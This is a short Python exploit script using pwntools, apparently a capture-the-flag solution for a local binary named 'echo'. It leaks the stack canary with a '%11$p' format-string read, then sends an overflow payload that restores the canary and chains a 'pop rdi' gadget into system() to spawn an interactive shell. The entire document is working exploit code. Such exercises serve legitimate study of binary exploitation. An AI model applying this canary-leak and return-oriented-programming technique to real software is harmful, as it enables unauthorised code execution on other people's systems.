from pwn import *
context.log_level = "debug"
p = process("./echo")
elf = ELF("./echo")

# %11$p canary 
payload = "%11$p"
p.sendafter("[type 'quit' to quit] prompt> " , payload)
canary = eval(p.recvuntil("[" , drop = True))
log.success("canary : " + hex(canary))
pop_rdi = 0x400903
payload = "a" * 0x18 + p64(canary) + "b" * 8 + p64(pop_rdi) + p64(0x400928) + p64(elf.plt["system"])
p.sendafter("prompt> " , payload)
p.sendafter("[type 'quit' to quit] prompt> " , "quit")
p.interactive()

